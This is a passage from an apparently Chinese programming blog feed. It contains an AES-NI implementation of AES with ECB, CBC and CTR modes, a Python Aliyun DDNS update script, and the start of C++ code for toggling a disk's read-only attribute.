class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">4</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">4</span>], <span class="hljs-number">0x10</span>));<br>    roundKey[<span class="hljs-number">6</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">5</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">5</span>], <span class="hljs-number">0x20</span>));<br>    roundKey[<span class="hljs-number">7</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">6</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">6</span>], <span class="hljs-number">0x40</span>));<br>    roundKey[<span class="hljs-number">8</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">7</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">7</span>], <span class="hljs-number">0x80</span>));<br>    roundKey[<span class="hljs-number">9</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">8</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">8</span>], <span class="hljs-number">0x1B</span>));<br>    roundKey[<span class="hljs-number">10</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">9</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">9</span>], <span class="hljs-number">0x36</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><p>轮密钥有了，下面实现加解密函数便可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> __m128i <span class="hljs-title">AES_Encrypt</span><span class="hljs-params">(__m128i plaintext, __m128i roundKey[<span class="hljs-number">11</span>])</span> </span>&#123;<br>    plaintext = _mm_xor_si128(plaintext, roundKey[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        plaintext = _mm_aesenc_si128(plaintext, roundKey[i]);<br><br>    <span class="hljs-keyword">return</span> _mm_aesenclast_si128(plaintext, roundKey[<span class="hljs-number">10</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> __m128i <span class="hljs-title">AES_Decrypt</span><span class="hljs-params">(__m128i cipher, __m128i roundKey[<span class="hljs-number">11</span>])</span> </span>&#123;<br>    cipher = _mm_xor_si128(cipher, roundKey[<span class="hljs-number">10</span>]);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">9</span>; i &gt; <span class="hljs-number">0</span>; i--)<br>        cipher = _mm_aesdec_si128(cipher, _mm_aesimc_si128(roundKey[i]));<br><br>    <span class="hljs-keyword">return</span> _mm_aesdeclast_si128(cipher, roundKey[<span class="hljs-number">0</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdint&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">static</span> __m128i <span class="hljs-title">AES_ExpandKey</span><span class="hljs-params">(__m128i key, __m128i generatedKey)</span> </span>&#123;<br>    generatedKey = _mm_shuffle_epi32(generatedKey, _MM_SHUFFLE(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>));<br>    key = _mm_xor_si128(key, _mm_slli_si128(key, <span class="hljs-number">4</span>));<br>    key = _mm_xor_si128(key, _mm_slli_si128(key, <span class="hljs-number">4</span>));<br>    key = _mm_xor_si128(key, _mm_slli_si128(key, <span class="hljs-number">4</span>));<br>    <span class="hljs-keyword">return</span> _mm_xor_si128(key, generatedKey);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">AES_GetRoundKeys</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> key[<span class="hljs-number">16</span>], __m128i roundKey[<span class="hljs-number">11</span>])</span> </span>&#123;<br>    roundKey[<span class="hljs-number">0</span>] = _mm_loadu_si128((<span class="hljs-type">const</span> __m128i*)(key));<br><br>    <span class="hljs-comment">//不能用循环！不能用循环！_mm_aeskeygenassist_si128第二个参数必须是编译时常量</span><br>    roundKey[<span class="hljs-number">1</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">0</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">0</span>], <span class="hljs-number">0x01</span>));<br>    roundKey[<span class="hljs-number">2</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">1</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">1</span>], <span class="hljs-number">0x02</span>));<br>    roundKey[<span class="hljs-number">3</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">2</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">2</span>], <span class="hljs-number">0x04</span>));<br>    roundKey[<span class="hljs-number">4</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">3</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">3</span>], <span class="hljs-number">0x08</span>));<br>    roundKey[<span class="hljs-number">5</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">4</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">4</span>], <span class="hljs-number">0x10</span>));<br>    roundKey[<span class="hljs-number">6</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">5</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">5</span>], <span class="hljs-number">0x20</span>));<br>    roundKey[<span class="hljs-number">7</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">6</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">6</span>], <span class="hljs-number">0x40</span>));<br>    roundKey[<span class="hljs-number">8</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">7</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">7</span>], <span class="hljs-number">0x80</span>));<br>    roundKey[<span class="hljs-number">9</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">8</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">8</span>], <span class="hljs-number">0x1B</span>));<br>    roundKey[<span class="hljs-number">10</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">9</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">9</span>], <span class="hljs-number">0x36</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> __m128i <span class="hljs-title">AES_Encrypt</span><span class="hljs-params">(__m128i plaintext, __m128i roundKey[<span class="hljs-number">11</span>])</span> </span>&#123;<br>    plaintext = _mm_xor_si128(plaintext, roundKey[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        plaintext = _mm_aesenc_si128(plaintext, roundKey[i]);<br><br>    <span class="hljs-keyword">return</span> _mm_aesenclast_si128(plaintext, roundKey[<span class="hljs-number">10</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> __m128i <span class="hljs-title">AES_Decrypt</span><span class="hljs-params">(__m128i cipher, __m128i roundKey[<span class="hljs-number">11</span>])</span> </span>&#123;<br>    cipher = _mm_xor_si128(cipher, roundKey[<span class="hljs-number">10</span>]);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">9</span>; i &gt; <span class="hljs-number">0</span>; i--)<br>        cipher = _mm_aesdec_si128(cipher, _mm_aesimc_si128(roundKey[i]));<br><br>    <span class="hljs-keyword">return</span> _mm_aesdeclast_si128(cipher, roundKey[<span class="hljs-number">0</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">uint8_t</span> key[<span class="hljs-number">16</span>] = &#123; <span class="hljs-string">&quot;this is key&quot;</span> &#125;;<br>    <span class="hljs-type">uint8_t</span> plaintext[<span class="hljs-number">16</span>] = &#123; <span class="hljs-string">&quot;plaintext&quot;</span> &#125;;<br>    <span class="hljs-type">uint8_t</span> cipher[<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">uint8_t</span> decrypted[<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><br>    <span class="hljs-comment">//计算轮密钥</span><br>    __m128i roundKey[<span class="hljs-number">11</span>];<br>    <span class="hljs-built_in">AES_GetRoundKeys</span>(key, roundKey);<br><br>    <span class="hljs-comment">//加密</span><br>    _mm_store_si128((__m128i*)cipher, <span class="hljs-built_in">AES_Encrypt</span>(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i*)plaintext), roundKey));<br><br>    <span class="hljs-comment">//解密</span><br>    _mm_store_si128((__m128i*)decrypted, <span class="hljs-built_in">AES_Decrypt</span>(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i*)cipher), roundKey));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实现操作模式"><a href="#实现操作模式" class="headerlink" title="实现操作模式"></a>实现操作模式</h2><p>加密主体写好了，剩下的实现各种操作模式就行了</p><p>库：<a href="https://github.com/Brassinolide/SIMD-AES">https://github.com/Brassinolide/SIMD-AES</a></p><h3 id="ECB-电子密码本"><a href="#ECB-电子密码本" class="headerlink" title="ECB(电子密码本)"></a>ECB(电子密码本)</h3><p>最简单的模式，对每个16字节分组都执行相同的加密操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C++">__m128i roundKey[<span class="hljs-number">11</span>];<br>_GetRoundKeys(key, roundKey);<br><br><span class="hljs-comment">//加密</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> offset = <span class="hljs-number">0</span>; offset &lt; cbBufferSize; offset += <span class="hljs-number">16</span>) &#123;<br>    _mm_store_si128((__m128i*)(buffer + offset), _AES_Encrypt(_mm_load_si128((<span class="hljs-type">const</span> __m128i*)(buffer + offset)), roundKey));<br>&#125;<br><br><span class="hljs-comment">//解密</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> offset = <span class="hljs-number">0</span>; offset &lt; cbBufferSize; offset += <span class="hljs-number">16</span>) &#123;<br>    _mm_store_si128((__m128i*)(buffer + offset), _AES_Decrypt(_mm_load_si128((<span class="hljs-type">const</span> __m128i*)(buffer + offset)), roundKey));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CBC-密码分组链接"><a href="#CBC-密码分组链接" class="headerlink" title="CBC(密码分组链接)"></a>CBC(密码分组链接)</h3><p>初始化向量和第一个明文分组异或后加密，第二个明文分组和第一个密文分组异或后加密，以此类推</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C++">__m128i roundKey[<span class="hljs-number">11</span>];<br>_GetRoundKeys(key, roundKey);<br><br><span class="hljs-comment">//加密</span><br>__m128i lastCipher = _mm_load_si128((<span class="hljs-type">const</span> __m128i*)iv);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> offset = <span class="hljs-number">0</span>; offset &lt; cbBufferSize; offset += <span class="hljs-number">16</span>) &#123;<br>    lastCipher = _AES_Encrypt(_mm_xor_si128(lastCipher, _mm_load_si128((<span class="hljs-type">const</span> __m128i*)(buffer + offset))), roundKey);<br>    _mm_store_si128((__m128i*)(buffer + offset), lastCipher);<br>&#125;<br><br><span class="hljs-comment">//解密</span><br>__m128i lastCipher = _mm_load_si128((<span class="hljs-type">const</span> __m128i*)iv);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> offset = <span class="hljs-number">0</span>; offset &lt; cbBufferSize; offset += <span class="hljs-number">16</span>) &#123;<br>    __m128i cipher = _mm_load_si128((<span class="hljs-type">const</span> __m128i*)(buffer + offset));<br>    _mm_store_si128((__m128i*)(buffer + offset), _mm_xor_si128(lastCipher, _AES_Decrypt(cipher, roundKey)));<br>    lastCipher = cipher;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CTR-计数器"><a href="#CTR-计数器" class="headerlink" title="CTR(计数器)"></a>CTR(计数器)</h3><p>加密计数器，再用计数器异或明文</p><p>CTR很方便的一点是不需要填充，而且加解密函数完全相同，不需要再编写额外解密代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C++">__m128i roundKey[<span class="hljs-number">11</span>];<br>_GetRoundKeys(key, roundKey);<br><br><span class="hljs-comment">//加密/解密</span><br>__m128i mask = _mm_set_epi32(<span class="hljs-number">0x00010203</span>, <span class="hljs-number">0x04050607</span>, <span class="hljs-number">0x08090a0b</span>, <span class="hljs-number">0x0c0d0e0f</span>);<br>__m128i ctr = _mm_shuffle_epi8(_mm_load_si128((<span class="hljs-type">const</span> __m128i*)iv), mask);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> offset = <span class="hljs-number">0</span>; offset &lt; cbBufferSize;) &#123;<br>    <span class="hljs-type">size_t</span> remaining = cbBufferSize - offset;<br>    <span class="hljs-keyword">if</span> (cbBufferSize - offset &gt;= <span class="hljs-number">16</span>) &#123;<br>        _mm_store_si128((__m128i*)(buffer + offset), _mm_xor_si128(_AES_Encrypt(_mm_shuffle_epi8(ctr, mask), roundKey), _mm_load_si128((<span class="hljs-type">const</span> __m128i*)(buffer + offset))));<br>        offset += <span class="hljs-number">16</span>;<br>        ctr = _mm_add_epi64(ctr, _mm_set_epi64x(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">uint8_t</span> temp[<span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; remaining; i++) temp[i] = buffer[i];<br>        _mm_store_si128((__m128i*)temp, _mm_xor_si128(_AES_Encrypt(_mm_shuffle_epi8(ctr, mask), roundKey), _mm_load_si128((<span class="hljs-type">const</span> __m128i*)temp)));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; remaining; i++) buffer[i] = temp[i];<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>就写到这里吧，剩下的模式懒得实现了，这3种够用（笑</p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python实现阿里云ddns</title>
    <link href="/articles/aliddns/"/>
    <url>/articles/aliddns/</url>
    
    <content type="html"><![CDATA[<p>家宽用NAT打洞建了个游戏服务器，由于家宽不是静态v4地址，所以需要折腾一下ddns</p><p>前往<a href="https://ram.console.aliyun.com/users">https://ram.console.aliyun.com/users</a> 创建一个用户，权限只需要<code>AliyunDNSFullAccess</code></p><p>创建后保存好<code>access_key_id</code>和<code>access_key_secret</code></p><p>安装SDK包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pip install alibabacloud_alidns20150109<br></code></pre></td></tr></table></figure><p>以下为ddns代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json,ipaddress<br><span class="hljs-keyword">from</span> alibabacloud_alidns20150109.client <span class="hljs-keyword">import</span> Client <span class="hljs-keyword">as</span> Alidns20150109Client<br><span class="hljs-keyword">from</span> alibabacloud_tea_openapi <span class="hljs-keyword">import</span> models <span class="hljs-keyword">as</span> open_api_models<br><span class="hljs-keyword">from</span> alibabacloud_alidns20150109 <span class="hljs-keyword">import</span> models <span class="hljs-keyword">as</span> alidns_20150109_models<br><span class="hljs-keyword">from</span> alibabacloud_tea_util.client <span class="hljs-keyword">import</span> Client <span class="hljs-keyword">as</span> UtilClient<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_ip</span>(<span class="hljs-params">record:<span class="hljs-built_in">str</span>, domain:<span class="hljs-built_in">str</span>, domain_rr:<span class="hljs-built_in">str</span>, access_key_id:<span class="hljs-built_in">str</span>, access_key_secret:<span class="hljs-built_in">str</span>, record_type:<span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;A&quot;</span>, endpoint:<span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;alidns.cn-hangzhou.aliyuncs.com&quot;</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> record_type == <span class="hljs-string">&quot;A&quot;</span>:<br>            addr = ipaddress.IPv4Address(record)<br>        <span class="hljs-keyword">elif</span> record_type == <span class="hljs-string">&quot;AAAA&quot;</span>:<br>            addr = ipaddress.IPv6Address(record)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;不支持的记录类型&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> addr.is_global:<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;仅可设置公网单播地址&quot;</span>)<br>    <span class="hljs-keyword">except</span> ipaddress.AddressValueError:<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;非合法IP&quot;</span>)<br>    <br>    client = Alidns20150109Client(open_api_models.Config(<br>        access_key_id=access_key_id,<br>        access_key_secret=access_key_secret,<br>        endpoint=endpoint<br>    ))<br><br>    resp = client.describe_domain_records(alidns_20150109_models.DescribeDomainRecordsRequest(domain_name = domain,rrkey_word=domain_rr))<br>    resp = json.loads(UtilClient.to_jsonstring(resp))[<span class="hljs-string">&#x27;body&#x27;</span>][<span class="hljs-string">&#x27;DomainRecords&#x27;</span>][<span class="hljs-string">&#x27;Record&#x27;</span>][<span class="hljs-number">0</span>]<br>    client.update_domain_record(alidns_20150109_models.UpdateDomainRecordRequest(rr = domain_rr,<span class="hljs-built_in">type</span> = record_type, record_id = resp[<span class="hljs-string">&#x27;RecordId&#x27;</span>], value=record))<br><br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>, <span class="hljs-string">f&quot;更新完成，更新前记录：<span class="hljs-subst">&#123;resp[<span class="hljs-string">&#x27;RR&#x27;</span>]&#125;</span>.<span class="hljs-subst">&#123;resp[<span class="hljs-string">&#x27;DomainName&#x27;</span>]&#125;</span> -&gt; <span class="hljs-subst">&#123;resp[<span class="hljs-string">&#x27;Value&#x27;</span>]&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#用法示例</span><br>error, message = update_ip(<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-string">&quot;crackme.net&quot;</span>, <span class="hljs-string">&quot;mc&quot;</span>, <span class="hljs-string">&quot;你的access_key_id&quot;</span>, <span class="hljs-string">&quot;你的access_key_secret&quot;</span>)<br><span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure><p>将以上代码整合进<a href="https://github.com/MikeWang000000/Natter">natter</a>中（Main loop上方），就能实现IP更换时自动设置DNS</p><p><img src="/articles/aliddns/1.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++设置和取消磁盘只读（实现diskpart功能）</title>
    <link href="/articles/mydiskpart/"/>
    <url>/articles/mydiskpart/</url>
    
    <content type="html"><![CDATA[<p>出门在外，为了保护U盘文件的安全，有时候需要设置只读</p><p>使用windows自带的程序diskpart可以实现这个功能，不过相当麻烦，需要先<code>list disk</code>列出磁盘，再<code>select disk</code>选择磁盘，最后<code>attributes disk set readonly</code>设置只读或者<code>attributes disk clear readonly</code>清除只读</p><p>diskpart也不支持命令行调用。为了简化以上操作，只能自己实现一个diskpart</p><p>参考<a href="https://stackoverflow.com/questions/40676088/how-to-set-a-flash-drive-on-readonly">https://stackoverflow.com/questions/40676088/how-to-set-a-flash-drive-on-readonly</a> 可以知道，向磁盘发送个控制代码就能设置只读</p><p>这里封装成四个函数方便调用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> HANDLE <span class="hljs-title">OpenPhysicalDrive</span><span class="hljs-params">(DWORD number)</span> </span>&#123;<br>    std::string disk = <span class="hljs-string">&quot;\\\\.\\PhysicalDrive&quot;</span>;<br>    disk += std::<span class="hljs-built_in">to_string</span>(number);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CreateFileA</span>(disk.<span class="hljs-built_in">c_str</span>(), FILE_READ_DATA | FILE_WRITE_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-number">0</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BOOL <span class="hljs-title">SetDiskReadOnly</span><span class="hljs-params">(HANDLE hDisk)</span> </span>&#123;<br>SET_DISK_ATTRIBUTES sda = &#123; <span class="hljs-built_in">sizeof</span>(sda), TRUE &#125;;<br>sda.AttributesMask = DISK_ATTRIBUTE_READ_ONLY;<br>sda.Attributes = DISK_ATTRIBUTE_READ_ONLY;<br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DeviceIoControl</span>(hDisk, IOCTL_DISK_SET_DISK_ATTRIBUTES, &amp;sda, <span class="hljs-built_in">sizeof</span>(sda), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BOOL <span class="hljs-title">ClearDiskReadOnly</span><span class="hljs-params">(HANDLE hDisk)</span> </span>&#123;<br>SET_DISK_ATTRIBUTES sda = &#123; <span class="hljs-built_in">sizeof</span>(sda), TRUE &#125;;<br>sda.AttributesMask = DISK_ATTRIBUTE_READ_ONLY;<br>sda.Attributes = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DeviceIoControl</span>(hDisk, IOCTL_DISK_SET_DISK_ATTRIBUTES, &amp;sda, <span class="hljs-built_in">sizeof</span>(sda), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> BOOL <span class="hljs-title">IsDiskReadOnly</span><span class="hljs-params">(HANDLE hDisk)</span> </span>&#123;<br>GET_DISK_ATTRIBUTES gda = &#123; <span class="hljs-built_in">sizeof</span>(gda) &#125;;<br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">DeviceIoControl</span>(hDisk, IOCTL_DISK_GET_DISK_ATTRIBUTES, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;gda, <span class="hljs-built_in">sizeof</span>(gda), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &amp;&amp; gda.Attributes == DISK_ATTRIBUTE_READ_ONLY);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是枚举物理磁盘，就是先枚举分卷再通过分卷查找到对应的物理磁盘</p><p>参考<a href="https://learn.microsoft.com/en-us/answers/questions/600061/how-to-list-all-physical-drives-and-find-there-dri">https://learn.microsoft.com/en-us/answers/questions/600061/how-to-list-all-physical-drives-and-find-there-dri</a></p><p>同样的封装成了函数方便调用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 